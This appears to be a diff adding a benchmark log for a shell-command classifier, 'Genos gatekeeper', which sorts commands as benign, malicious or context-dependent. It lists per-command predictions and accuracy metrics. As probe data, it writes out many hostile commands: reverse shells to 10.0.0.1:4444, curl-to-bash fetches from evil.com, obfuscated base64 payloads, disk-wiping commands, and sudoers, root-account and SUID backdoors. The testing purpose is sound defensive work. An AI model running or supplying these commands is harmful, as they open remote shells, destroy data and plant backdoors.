@@ -1,0 +1,221 @@
+Warning: You are sending unauthenticated requests to the HF Hub. Please set a HF_TOKEN to enable higher rate limits and faster downloads.
+[*] Initializing Genos engine...
+Loading weights:   0%|          | 0/199 [00:00<?, ?it/s]Loading weights: 100%|██████████| 199/199 [00:00<00:00, 16901.21it/s]
+Loading weights:   0%|          | 0/199 [00:00<?, ?it/s]Loading weights: 100%|██████████| 199/199 [00:00<00:00, 18124.04it/s]
+
+====================================================================================================
+  PROBE SET — 3-Class Gatekeeper Benchmark
+====================================================================================================
+   # │           Expected │                Got │  Conf │   OK │       ms │ Command
+──────────────────────────────────────────────────────────────────────────────────
+   1 │             Benign │             Benign │  94.2 │    ✓ │    228ms │ ls -la /var/log
+   2 │             Benign │             Benign │  95.2 │    ✓ │      7ms │ df -h
+   3 │             Benign │             Benign │  44.0 │    ✓ │     16ms │ uptime
+   4 │             Benign │             Benign │  85.4 │    ✓ │      6ms │ whoami
+   5 │             Benign │          Malicious │  57.7 │    ✗ │     13ms │ pwd
+   6 │             Benign │             Benign │  83.0 │    ✓ │      6ms │ echo "hello world"
+   7 │             Benign │             Benign │  88.9 │    ✓ │      6ms │ date +%Y-%m-%d
+   8 │             Benign │  Context_Dependent │  98.3 │    ✗ │     13ms │ ps aux --sort=-%mem | head -10
+   9 │             Benign │             Benign │  85.6 │    ✓ │      6ms │ free -m
+  10 │             Benign │          Malicious │  67.7 │    ✗ │     12ms │ id
+  11 │             Benign │             Benign │  47.6 │    ✓ │      6ms │ du -sh /tmp
+  12 │             Benign │             Benign │  96.2 │    ✓ │      6ms │ ls -lR /home
+  13 │             Benign │  Context_Dependent │  97.8 │    ✗ │     13ms │ cat /proc/cpuinfo | head -20
+  14 │             Benign │             Benign │  52.7 │    ✓ │     13ms │ top -bn1 | head -5
+  15 │             Benign │             Benign │  94.2 │    ✓ │      6ms │ ping -c 3 8.8.8.8
+  16 │             Benign │  Context_Dependent │  96.6 │    ✗ │     13ms │ dig google.com
+  17 │             Benign │  Context_Dependent │  54.3 │    ✗ │     13ms │ grep -r "error" /var/log/syslog | tail -20
+  18 │             Benign │             Benign │  86.6 │    ✓ │      6ms │ find /tmp -type f -mtime -1
+  19 │             Benign │             Benign │  91.3 │    ✓ │      6ms │ systemctl status nginx
+  20 │             Benign │             Benign │  90.0 │    ✓ │      6ms │ journalctl -u sshd --no-pager -n 20
+  21 │             Benign │  Context_Dependent │  98.3 │    ✗ │     13ms │ mount | grep ext4
+  22 │             Benign │  Context_Dependent │  95.8 │    ✗ │     12ms │ lsblk
+  23 │             Benign │  Context_Dependent │  98.6 │    ✗ │     12ms │ history | tail -10
+  24 │             Benign │  Context_Dependent │  68.0 │    ✗ │     12ms │ file /bin/ls
+  25 │             Benign │  Context_Dependent │  98.2 │    ✗ │     12ms │ head -5 /etc/group
+  26 │             Benign │             Benign │  93.7 │    ✓ │      6ms │ ls /usr/bin | wc -l
+  27 │             Benign │  Context_Dependent │  98.0 │    ✗ │     12ms │ dpkg -l | grep python
+  28 │             Benign │  Context_Dependent │  96.4 │    ✗ │     12ms │ pip list 2>/dev/null | head -10
+  29 │             Benign │             Benign │  95.8 │    ✓ │      6ms │ git log --oneline -5
+  30 │             Benign │  Context_Dependent │  65.9 │    ✗ │     12ms │ docker ps
+  31 │             Benign │  Context_Dependent │  98.0 │    ✗ │     12ms │ kubectl get pods 2>/dev/null
+  32 │             Benign │  Context_Dependent │  97.3 │    ✗ │     12ms │ ss -tuln
+  33 │             Benign │  Context_Dependent │  96.7 │    ✗ │     12ms │ route -n
+  34 │             Benign │  Context_Dependent │  91.8 │    ✗ │     12ms │ crontab -l
+  35 │             Benign │  Context_Dependent │  51.1 │    ✗ │     12ms │ tar tzf backup.tar.gz 2>/dev/null | head -5
+  36 │             Benign │  Context_Dependent │  52.8 │    ✗ │     12ms │ md5sum /etc/passwd
+  37 │             Benign │             Benign │  62.8 │    ✓ │      6ms │ chmod 644 myfile.txt
+  38 │             Benign │             Benign │  81.4 │    ✓ │      6ms │ cp /tmp/report.csv /home/user/reports/
+  39 │  Context_Dependent │  Context_Dependent │  98.3 │    ✓ │     12ms │ cat /etc/hostname
+  40 │  Context_Dependent │             Benign │  57.9 │    ✗ │      6ms │ hostname
+  41 │  Context_Dependent │             Benign │  94.1 │    ✗ │      6ms │ uname -a
+  42 │  Context_Dependent │  Context_Dependent │  97.6 │    ✓ │     12ms │ ip addr show
+  43 │  Context_Dependent │  Context_Dependent │  81.0 │    ✓ │     12ms │ wc -l /etc/passwd
+  44 │  Context_Dependent │             Benign │  61.4 │    ✗ │      6ms │ tail -n 50 /var/log/auth.log
+  45 │  Context_Dependent │  Context_Dependent │  98.5 │    ✓ │     12ms │ cat /etc/os-release
+  46 │  Context_Dependent │  Context_Dependent │  97.0 │    ✓ │     12ms │ env | grep PATH
+  47 │  Context_Dependent │          Malicious │  64.1 │    ✗ │     12ms │ alias
+  48 │  Context_Dependent │  Context_Dependent │  95.2 │    ✓ │     12ms │ stat /etc/passwd
+  49 │  Context_Dependent │  Context_Dependent │  97.8 │    ✓ │     12ms │ netstat -rn
+  50 │  Context_Dependent │  Context_Dependent │  97.7 │    ✓ │     12ms │ arp -a
+  51 │  Context_Dependent │  Context_Dependent │  96.2 │    ✓ │     12ms │ curl -s https://ifconfig.me
+  52 │  Context_Dependent │          Malicious │  92.8 │    ✗ │     12ms │ rm -rf / --no-preserve-root
+  53 │  Context_Dependent │             Benign │  74.6 │    ✗ │      6ms │ :(){ :|:& };:
+  54 │  Context_Dependent │          Malicious │  55.0 │    ✗ │     12ms │ dd if=/dev/zero of=/dev/sda bs=1M
+  55 │  Context_Dependent │             Benign │  55.6 │    ✗ │      6ms │ mkfs.ext4 /dev/sda1
+  56 │  Context_Dependent │  Context_Dependent │  98.6 │    ✓ │     13ms │ nmap -sS -p- 192.168.1.0/24
+  57 │  Context_Dependent │  Context_Dependent │  98.7 │    ✓ │     12ms │ nmap -sV --script=vuln 10.0.0.5
+  58 │  Context_Dependent │  Context_Dependent │  98.7 │    ✓ │     13ms │ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5
+  59 │  Context_Dependent │  Context_Dependent │  98.4 │    ✓ │     12ms │ sqlmap -u "http://target.com/page?id=1" --dbs
+  60 │  Context_Dependent │  Context_Dependent │  98.0 │    ✓ │     12ms │ nikto -h http://target.com
+  61 │  Context_Dependent │          Malicious │  92.6 │    ✗ │     13ms │ msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x64/m…
+  62 │  Context_Dependent │          Malicious │  94.2 │    ✗ │     12ms │ john /tmp/crackme --wordlist=/usr/share/wordlists/rockyou.txt
+  63 │  Context_Dependent │          Malicious │  78.6 │    ✗ │     12ms │ iptables -F && iptables -P INPUT ACCEPT && iptables -P FORWARD AC…
+  64 │  Context_Dependent │  Context_Dependent │  98.0 │    ✓ │     12ms │ find / -perm -4000 -type f 2>/dev/null
+  65 │  Context_Dependent │          Malicious │  83.1 │    ✗ │     13ms │ ettercap -T -q -i eth0 -M arp:remote /10.0.0.1// /10.0.0.254//
+  66 │  Context_Dependent │          Malicious │  95.5 │    ✗ │     13ms │ arpspoof -i eth0 -t 10.0.0.1 10.0.0.254
+  67 │  Context_Dependent │  Context_Dependent │  89.8 │    ✓ │     13ms │ responder -I eth0 -wrf
+  68 │  Context_Dependent │  Context_Dependent │  88.9 │    ✓ │     13ms │ python3 -c "import pty; pty.spawn('/bin/bash')"
+  69 │  Context_Dependent │          Malicious │  96.8 │    ✗ │     13ms │ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec spri…
+  70 │  Context_Dependent │          Malicious │  98.2 │    ✗ │     13ms │ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:…
+  71 │  Context_Dependent │          Malicious │  97.7 │    ✗ │     13ms │ openssl s_client -quiet -connect 10.0.0.1:4444 | /bin/bash | open…
+  72 │  Context_Dependent │          Malicious │  97.8 │    ✗ │     13ms │ base64 -d <<< "Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo" …
+  73 │  Context_Dependent │          Malicious │  95.4 │    ✗ │     12ms │ xterm -display 10.0.0.1:1 -e /bin/bash
+  74 │  Context_Dependent │  Context_Dependent │  98.5 │    ✓ │     12ms │ chisel client 10.0.0.1:8080 R:1080:socks
+  75 │  Context_Dependent │  Context_Dependent │  98.6 │    ✓ │     12ms │ ssh -D 1080 -fNq user@10.0.0.1
+  76 │  Context_Dependent │  Context_Dependent │  96.6 │    ✓ │     12ms │ tcpdump -i eth0 -w /tmp/capture.pcap
+  77 │          Malicious │          Malicious │  97.8 │    ✓ │     12ms │ curl http://evil.com/shell.sh | bash
+  78 │          Malicious │          Malicious │  98.3 │    ✓ │     12ms │ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+  79 │          Malicious │          Malicious │  96.8 │    ✓ │     13ms │ python3 -c "import socket,subprocess,os;s=socket.socket();s.conne…
+  80 │          Malicious │          Malicious │  97.3 │    ✓ │     12ms │ nc -e /bin/sh 10.0.0.1 4444
+  81 │          Malicious │          Malicious │  98.4 │    ✓ │     12ms │ echo "* * * * * curl http://evil.com/mine | bash" | crontab -
+  82 │          Malicious │          Malicious │  96.1 │    ✓ │     13ms │ wget -q http://malware.site/payload -O /tmp/.hidden && chmod +x /…
+  83 │          Malicious │  Context_Dependent │  98.1 │    ✗ │     12ms │ cat /etc/shadow
+  84 │          Malicious │          Malicious │  92.2 │    ✓ │     12ms │ unshadow /etc/passwd /etc/shadow > /tmp/crackme
+  85 │          Malicious │          Malicious │  96.0 │    ✓ │     16ms │ powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
+  86 │          Malicious │          Malicious │  85.7 │    ✓ │     12ms │ chmod u+s /bin/bash
+  87 │          Malicious │          Malicious │  95.9 │    ✓ │     12ms │ cp /bin/bash /tmp/.backdoor && chmod u+s /tmp/.backdoor
+  88 │          Malicious │          Malicious │  97.4 │    ✓ │     12ms │ echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+  89 │          Malicious │          Malicious │  95.4 │    ✓ │     13ms │ useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
+  90 │          Malicious │          Malicious │  68.0 │    ✓ │     13ms │ ssh-keygen -t rsa -N "" -f /tmp/key && cat /tmp/key.pub >> /root/…
+  91 │          Malicious │          Malicious │  98.5 │    ✓ │     12ms │ mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+  92 │          Malicious │          Malicious │  98.7 │    ✓ │     12ms │ certutil -urlcache -split -f http://evil.com/payload.exe C:\Windo…
+  93 │          Malicious │          Malicious │  98.3 │    ✓ │     13ms │ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Upd…
+  94 │          Malicious │          Malicious │  97.9 │    ✓ │     12ms │ schtasks /create /tn "Updater" /tr "powershell -ep bypass -f C:\p…
+  95 │          Malicious │          Malicious │  94.1 │    ✓ │     12ms │ wmic process call create "cmd /c powershell -ep bypass -f C:\payl…
+  96 │          Malicious │          Malicious │  98.5 │    ✓ │     12ms │ bitsadmin /transfer job /download /priority high http://evil.com/…
+  97 │          Malicious │          Malicious │  96.8 │    ✓ │     13ms │ perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_S…
+  98 │          Malicious │          Malicious │  97.8 │    ✓ │     12ms │ php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3…
+  99 │          Malicious │          Malicious │  97.8 │    ✓ │     16ms │ eval $(echo "Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZC5zaCB8IGJhc2g=…
+ 100 │          Malicious │          Malicious │  62.1 │    ✓ │     12ms │ linpeas.sh
+ 101 │          Malicious │          Malicious │  97.3 │    ✓ │     12ms │ ./pspy64
+
+  Accuracy: 62/101 (61.4%)
+  Macro F1: 0.6199
+  Avg latency: 13.4ms  |  p50: 12.3ms  |  p95: 13.3ms
+
+  Class                    Prec      Rec       F1  Support
+  ────────────────────────────────────────────────────────
+  Benign                 0.7826   0.4737   0.5902       38
+  Malicious              0.6154   0.9600   0.7500       25
+  Context_Dependent      0.5128   0.5263   0.5195       38
+
+  Confusion Matrix (rows=true, cols=predicted):
+                         BEN   MAL   CTX
+  BEN                     18     2    18
+  MAL                      0    24     1
+  CTX                      5    13    20
+
+  Routing distribution:
+    Benign               →  22.8%
+    Malicious            →  38.6%
+    Context_Dependent    →  38.6%
+
+  Misclassifications (39):
+    #5   expected=Benign             got=Malicious          conf= 57.7  cmd=pwd
+    #8   expected=Benign             got=Context_Dependent  conf= 98.3  cmd=ps aux --sort=-%mem | head -10
+    #10  expected=Benign             got=Malicious          conf= 67.7  cmd=id
+    #13  expected=Benign             got=Context_Dependent  conf= 97.8  cmd=cat /proc/cpuinfo | head -20
+    #16  expected=Benign             got=Context_Dependent  conf= 96.6  cmd=dig google.com
+    #17  expected=Benign             got=Context_Dependent  conf= 54.3  cmd=grep -r "error" /var/log/syslog | tail -20
+    #21  expected=Benign             got=Context_Dependent  conf= 98.3  cmd=mount | grep ext4
+    #22  expected=Benign             got=Context_Dependent  conf= 95.8  cmd=lsblk
+    #23  expected=Benign             got=Context_Dependent  conf= 98.6  cmd=history | tail -10
+    #24  expected=Benign             got=Context_Dependent  conf= 68.0  cmd=file /bin/ls
+    #25  expected=Benign             got=Context_Dependent  conf= 98.2  cmd=head -5 /etc/group
+    #27  expected=Benign             got=Context_Dependent  conf= 98.0  cmd=dpkg -l | grep python
+    #28  expected=Benign             got=Context_Dependent  conf= 96.4  cmd=pip list 2>/dev/null | head -10
+    #30  expected=Benign             got=Context_Dependent  conf= 65.9  cmd=docker ps
+    #31  expected=Benign             got=Context_Dependent  conf= 98.0  cmd=kubectl get pods 2>/dev/null
+    #32  expected=Benign             got=Context_Dependent  conf= 97.3  cmd=ss -tuln
+    #33  expected=Benign             got=Context_Dependent  conf= 96.7  cmd=route -n
+    #34  expected=Benign             got=Context_Dependent  conf= 91.8  cmd=crontab -l
+    #35  expected=Benign             got=Context_Dependent  conf= 51.1  cmd=tar tzf backup.tar.gz 2>/dev/null | head -5
+    #36  expected=Benign             got=Context_Dependent  conf= 52.8  cmd=md5sum /etc/passwd
+    #40  expected=Context_Dependent  got=Benign             conf= 57.9  cmd=hostname
+    #41  expected=Context_Dependent  got=Benign             conf= 94.1  cmd=uname -a
+    #44  expected=Context_Dependent  got=Benign             conf= 61.4  cmd=tail -n 50 /var/log/auth.log
+    #47  expected=Context_Dependent  got=Malicious          conf= 64.1  cmd=alias
+    #52  expected=Context_Dependent  got=Malicious          conf= 92.8  cmd=rm -rf / --no-preserve-root
+    #53  expected=Context_Dependent  got=Benign             conf= 74.6  cmd=:(){ :|:& };:
+    #54  expected=Context_Dependent  got=Malicious          conf= 55.0  cmd=dd if=/dev/zero of=/dev/sda bs=1M
+    #55  expected=Context_Dependent  got=Benign             conf= 55.6  cmd=mkfs.ext4 /dev/sda1
+    #61  expected=Context_Dependent  got=Malicious          conf= 92.6  cmd=msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterp…
+    #62  expected=Context_Dependent  got=Malicious          conf= 94.2  cmd=john /tmp/crackme --wordlist=/usr/share/wordlists/rockyou.txt
+    #63  expected=Context_Dependent  got=Malicious          conf= 78.6  cmd=iptables -F && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT
+    #65  expected=Context_Dependent  got=Malicious          conf= 83.1  cmd=ettercap -T -q -i eth0 -M arp:remote /10.0.0.1// /10.0.0.254//
+    #66  expected=Context_Dependent  got=Malicious          conf= 95.5  cmd=arpspoof -i eth0 -t 10.0.0.1 10.0.0.254
+    #69  expected=Context_Dependent  got=Malicious          conf= 96.8  cmd=ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("…
+    #70  expected=Context_Dependent  got=Malicious          conf= 98.2  cmd=socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
+    #71  expected=Context_Dependent  got=Malicious          conf= 97.7  cmd=openssl s_client -quiet -connect 10.0.0.1:4444 | /bin/bash | openssl s…
+    #72  expected=Context_Dependent  got=Malicious          conf= 97.8  cmd=base64 -d <<< "Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo" | bas…
+    #73  expected=Context_Dependent  got=Malicious          conf= 95.4  cmd=xterm -display 10.0.0.1:1 -e /bin/bash
+    #83  expected=Malicious          got=Context_Dependent  conf= 98.1  cmd=cat /etc/shadow
+
+====================================================================================================
+  TEST SET — gatekeeper_3class_test.csv
+====================================================================================================
+  Evaluating 10039 test samples...
+    ... 500/10039
+    ... 1000/10039
+    ... 1500/10039
+    ... 2000/10039
+    ... 2500/10039
+    ... 3000/10039
+    ... 3500/10039
+    ... 4000/10039
+    ... 4500/10039
+    ... 5000/10039
+    ... 5500/10039
+    ... 6000/10039
+    ... 6500/10039
+    ... 7000/10039
+    ... 7500/10039
+    ... 8000/10039
+    ... 8500/10039
+    ... 9000/10039
+    ... 9500/10039
+    ... 10000/10039
+
+  Accuracy: 9432/10039 (94.0%)
+  Macro F1: 0.9211
+  Avg latency: 9.0ms  |  p50: 6.0ms  |  p95: 12.8ms
+
+  Class                    Prec      Rec       F1  Support
+  ────────────────────────────────────────────────────────
+  Benign                 0.9638   0.9499   0.9568     5553
+  Malicious              0.9282   0.9671   0.9473     2983
+  Context_Dependent      0.8724   0.8463   0.8592     1503
+
+  Confusion Matrix (rows=true, cols=predicted):
+                         BEN   MAL   CTX
+  BEN                   5275   144   134
+  MAL                     46  2885    52
+  CTX                    152    79  1272
+
+  Routing distribution:
+    Benign               →  54.5%
+    Malicious            →  31.0%
+    Context_Dependent    →  14.5%
+
+[+] Results saved to /home/sam/genos/genos_api/logs/gatekeeper_3class_benchmark.json
